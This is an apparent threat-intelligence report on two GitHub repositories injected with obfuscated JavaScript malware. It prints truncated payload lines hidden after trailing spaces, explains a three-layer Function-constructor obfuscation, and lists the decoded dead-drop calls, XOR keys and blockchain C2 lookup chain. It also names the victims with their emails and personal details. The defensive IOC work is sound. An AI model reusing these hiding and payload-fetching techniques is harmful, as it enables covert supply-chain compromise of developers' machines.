# Victim Analysis: yadolahabbasnia/PostNia (5-4-39) + madgrv/intelli-app-store (5-167)

**Dates of injection:** 2026-06-03T14:12Z (intelli-app-store) · 2026-06-04T18:46Z (PostNia)  
**Campaigns:** 5-4-39 · 5-167  
**Cipher:** `_$_b229` — NEW cipher with 3-layer obfuscation  
**Status:** Both live and unpatched at time of analysis (2026-06-27)  
**Wave:** June 2026 — infrastructure rotation wave; precedes the zurichjs-conf 5-2-319 injection (Jun 26)

---

## Summary

These two injections constitute the **first confirmed appearances of the `_$_b229` cipher**, a
new Stage 0 that signifies C2 infrastructure rotation by the actor. The XOR keys are unchanged
but all wallet addresses and dead-drop lookup mechanisms have been updated:

| IOC | Old (`_$_913e`) | New (`_$_b229`) |
|-----|-----------------|-----------------|
| TRON W1 | `TCqf6ZkaQD84vYsC2cuu1jRwB6JveTaRrF` | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` |
| TRON W2 | `TFMryB9m6d4kBMRjEVyFRbqKSV1cV2NcpH` | `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` |
| BSC dead-drop | Hardcoded TX hashes | **Dynamically fetched** from TRON TX data |
| Aptos fallback | `None` | `0xbe037400...` / `0x3f0e5781...` |
| XOR key 1 | `2[gWfGj;<:-93Z^C` | **`2[gWfGj;<:-93Z^C`** (unchanged) |
| XOR key 2 | `m6:tTh^D)cBz?NM]` | **`m6:tTh^D)cBz?NM]`** (unchanged) |

The matching XOR keys confirm operational continuity — the Stage 1 and beyond payloads are
decrypted the same way, just served from a rotated dead-drop chain. The actor updated their
blockchain infrastructure while keeping the payload decryption scheme intact.

---

## 1. yadolahabbasnia/PostNia — Campaign 5-4-39

### Injection Details

| Field | Value |
|-------|-------|
| Repository | yadolahabbasnia/PostNia |
| Infected file | `server.js` |
| Commit SHA | `edb158642` |
| Commit message | "feat: initial proj" |
| Author | `Yadollah Abbasnia <y.abbasnia@gmail.com>` |
| Author date | 2026-05-04T13:16:31Z |
| Committer name | **`Yadollah`** ← local git config (first name only) |
| Committer email | `y.abbasnia@gmail.com` |
| Committer date | 2026-06-04T18:46:57Z |
| Gap | **+749 hours 30 minutes (~31 days)** |
| Payload vector | Raw `_$_b229` cipher inline, after trailing spaces |
| Trailing spaces | 709 spaces |
| Payload offset | byte 10,190 (file: 14,864 bytes total) |
| Payload size | 4,674 chars |

The infected commit is the **second legitimate code commit** in the repository — only three
initial README edits preceded it. The project was brand new (repo created 2026-05-02) and the
developer's very first substantial code push became the injection target.

### Target Profile

`PostNia` is a Node.js REST API built with `express` and `jose` (JSON Web Token library).
`server.js` is both the entry point and the only application file — all application logic lives
in the file the actor infected. Persistent access on this developer's machine would expose:
- JWT signing keys used by the PostNia API
- Express application credentials and config
- All local development environment secrets

### Victim Profile: yadolahabbasnia (Yadollah Abbasnia)

- **GitHub login:** yadolahabbasnia
- **Display name:** Yadollah Abbasnia
- **Account created:** 2017-11-02 (9-year-old account)
- **Public repos:** 2 — PostNia and `visa-sponsers-companies-for-iranians` (from 2023)
- **Bio:** Backend Developer
- **Real email (local git):** `y.abbasnia@gmail.com`
- **Committer name:** `Yadollah` — first name only, same truncation as `Christian` (tsc-signer)
  and `Faris` (zurichjs), confirming this is the developer's own machine

`visa-sponsers-companies-for-iranians` is a 3-year-old inactive repo (a data list). The developer
appears to be returning to active development with PostNia after a gap.

---

## 2. madgrv/intelli-app-store — Campaign 5-167

### Injection Details

| Field | Value |
|-------|-------|
| Repository | madgrv/intelli-app-store |
| Infected files | `tailwind.config.ts` and `scripts/sync-design-system.js` |
| Commit SHA | `95cb10675` |
| Commit message | "fix: uniform card heights in grid and correct crypto badge colour to orange" |
| Author | `madgrv <mad.grv@gmail.com>` |
| Author date | 2026-05-20T03:34:51Z |
| Committer name | `madgrv` |
| Committer email | `mad.grv@gmail.com` |
| Committer date | 2026-06-03T14:12:56Z |
| Gap | **+346 hours 38 minutes (~14 days)** |
| Parents | `1276e08ee` ("docs: rewrite README for take-home task assessment") |

**`intelli-app-store` is a take-home technical assessment project.** The commit immediately
preceding the infected one explicitly rewrote the README "for take-home task assessment",
confirming this is portfolio/interview work — not a production service. Despite this, the
actor's automation injected it alongside genuine applications.

### Dual Injection — Two Different Vectors in the Same Commit

This is the first case observed in the campaign where a single commit carries **two different
injection techniques** in two separate files:

**File 1: `scripts/sync-design-system.js`** — raw `_$_b229` cipher (same as PostNia server.js)
```
console.log('✓ Design system synced to global.css');[709 trailing spaces]global.i='5-167';var _$_b229=...
```
Campaign ID: `global.i='5-167'`

**File 2: `tailwind.config.ts`** — base64-encoded decoded Stage 0 via `eval(atob(...))`
```
export default config;[596 trailing spaces]eval("global['_V']='5-167';"+atob('Z2xvYmFsWy...'))
```
Campaign ID via `global['_V']='5-167'`

The tailwind injection uses `global['_V']` (the Stage 1 continuation variable) as the outer
campaign ID carrier, while the sync-design-system injection uses `global.i` (the standard
campaign ID variable). This discrepancy suggests the two injection templates were built
independently within the actor's tooling and share the same inner Stage 0 code via different
encoding paths.

The `tailwind.config.ts` injection payload (1,973 chars after base64 decode) is the **fully
decoded Stage 0 in plaintext** — no cipher needed, just atob. This makes IOC extraction
trivially easy but gives the actor redundancy: if one injected file is removed or the cipher
fails to execute, the other may still reach Stage 1.

### Victim Profile: madgrv (Matteo Galesi)

- **GitHub login:** madgrv
- **Display name:** Matteo Galesi
- **Account created:** 2017-09-23 (9-year-old account)
- **Location:** London
- **Public repos:** 26 — mix of frontend projects
- **Real email (local git):** `mad.grv@gmail.com`
- **Committer name:** `madgrv` — matches GitHub username (same pattern as kinyichukwu)
- **Only infected repo:** `intelli-app-store` — no other madgrv repos contain payloads

---

## New Cipher: `_$_b229` — Three-Layer Obfuscation

The `_$_b229` cipher is a significant upgrade in obfuscation complexity over `_$_913e`.

### Layer 1 — Short bootstrap table

```javascript
var _$_b229 = (function(j,c){
    // shuffle cipher: offsets 226/515, mods 13874/23159, modulus 6342606
})("j%b%eocmrt", 3590695);
// Decodes to: ['r', 'object', 'm']
```

A 3-element table maps to `require`, `object`, `module` — the bare minimum to bootstrap.

Cipher parameters:
- Shuffle offsets: **226** / **515**
- Modular additions: **13874** / **23159**
- Modulus: **6342606**
- Seed: **3590695**

### Layer 2 — `Function` constructor via property access

```javascript
var mfw = mHy['constructor'];  // mHy['constructor'] === Function
var eIM = mfw;
```

The `mHy` function's `.constructor` property is the built-in `Function` constructor. Accessing
it via a decoded string (`tvp = decode_mHy('cruouqpnjotsbtyfcrihetosdlmnragwvkcxz')[:11]`
→ `'constructor'`) avoids the literal string `"Function"` appearing in the source.

`mHy` itself is a second shuffle cipher with different parameters:
- Shuffle offset: **303** (both directions)
- Modular additions: **35935** / **13099**
- Modulus: **3843290**
- Seed: **740160**

### Layer 3 — Dynamic code generation

```javascript
var Qsv = mfw("", mHy(dpK));  // Function("", <decoded_code>)
```

`mHy(dpK)` decodes the `dpK` encoded variable to JavaScript source code — a custom
substitution/decompression function. `Function("", code)` creates and executes it without
using `eval`. The resulting function then decodes the main payload `AYN` with seed `WXs`,
returning the decoded Stage 0 function `yGv`. Finally:

```javascript
yGv(1632);  // execute Stage 0 with activation code 1632
```

The `1632` activation code is new — the `_$_913e` campaigns did not pass a numeric activation
argument. `2952` is returned and unused — likely a deliberate red herring or anti-analysis
sentinel.

**Comparison:**

| Property | `_$_913e` | `_$_b229` |
|----------|-----------|-----------|
| Cipher layers | 1 | 3 |
| Encoded string visible in source | Yes | Partial (main table inside `AYN`) |
| `Function` constructor abuse | No | Yes |
| Activation code | None | `1632` |
| Stage 0 size (decoded) | 3,743 chars | ~1,973 chars (simpler) |

---

## IOC Changeset: Infrastructure Rotation

The `tailwind.config.ts` inner payload (fully decoded Stage 0) reveals the complete new IOC set:

```javascript
// First dead-drop chain (key1 + W1 TRON + Aptos fallback1)
await t("2[gWfGj;<:-93Z^C",
        "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP",
        "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e");

// Second dead-drop chain (key2 + W2 TRON + Aptos fallback2)
await t("m6:tTh^D)cBz?NM]",
        "TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG",
        "0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3");
```

**New C2 lookup chain:**
1. Query TRON API for wallet W1's last TX → decode `raw_data.data` hex → reverse string → BSC TX hash
2. Query BSC RPC for that TX → extract data after `?.?` delimiter → XOR decrypt with key 1 → Stage 1
3. Repeat with W2 for Stage 1 child-process spawn

The BSC TX hashes are **no longer hardcoded** in the binary — they are dynamically retrieved
from the TRON wallet's last transaction memo field. This makes detection harder: static analysis
of the binary finds only the TRON wallet address and Aptos fallback; the actual Stage 1 payload
location is only knowable at runtime by querying the blockchain.

The Aptos addresses (`0xbe037400...`, `0x3f0e5781...`) are new IOC types — the previous campaigns
used Aptos only as a last resort and those addresses weren't confirmed in our analysis.

---

## Campaign Number Format: `5-4-39` and `5-167`

**`5-4-39`:** Follows the `5-X-YYY` format with a new `5-4-*` prefix. Compared to the May wave
(`5-3-*` campaigns: 161, 225, 252, 296, 298, 341), the `5-4-*` prefix likely denotes a new
campaign batch or generation — possibly corresponding to the infrastructure rotation event
(new TRON wallets, new cipher).

**`5-167`:** Missing the middle segment — no `5-X-167` structure. Either:
1. An abbreviated form of `5-1-167` (batch 1, target 167)
2. A different ID schema used for this specific target batch
3. An error or test artifact in the campaign numbering

Both campaign IDs are confirmed to use the `_$_b229` cipher. No other `5-4-*` or `5-167`
campaigns have been found in the code search, suggesting these may be early entries in a
new batch that is still being deployed.

---

## June 2026 Wave Timeline

| Date (UTC) | Target | Campaign | Cipher |
|------------|--------|----------|--------|
| 2026-06-03T14:12Z | madgrv/intelli-app-store | 5-167 | `_$_b229` |
| 2026-06-04T18:46Z | yadolahabbasnia/PostNia | 5-4-39 | `_$_b229` |
| 2026-06-26T04:55Z | zurichjs-conf PR#199 | 5-2-319 | `_$_4445` |

The `_$_b229` wave precedes the zurichjs `_$_4445` infection by 3 weeks, suggesting:
- The actor was actively developing and deploying new cipher variants throughout June
- The `_$_4445` cipher (zurichjs-conf) may represent a third parallel development track,
  or a further evolution of the obfuscation scheme
- All three June 2026 cipher variants share the same XOR keys, confirming one actor group
